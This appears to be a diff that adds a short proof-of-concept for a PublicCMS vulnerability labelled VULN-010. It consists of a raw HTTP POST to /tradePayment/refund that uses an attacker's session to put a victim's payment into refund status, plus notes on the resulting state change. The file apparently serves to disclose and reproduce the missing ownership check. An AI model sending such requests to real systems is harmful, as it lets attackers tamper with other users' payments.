@@ -1,0 +1,10 @@
+### VULN-010 — cross-user payment -> PENDING_REFUND (missing owner check)
+### Precondition (seeded, no gateway): victim's PAID trade_payment.
+POST /tradePayment/refund HTTP/1.1
+Host: site2.dev.publiccms.com
+Cookie: PUBLICCMS_USER=<attacker-id>_<token>
+Content-Type: application/x-www-form-urlencoded
+
+_csrf=<token>&paymentId=<victim-payment-id>&amount=1.00&reason=poc&returnUrl=/
+
+### -> 302; victim's payment status 1(PAID) -> 2(PENDING_REFUND); attacker-owned trade_refund created
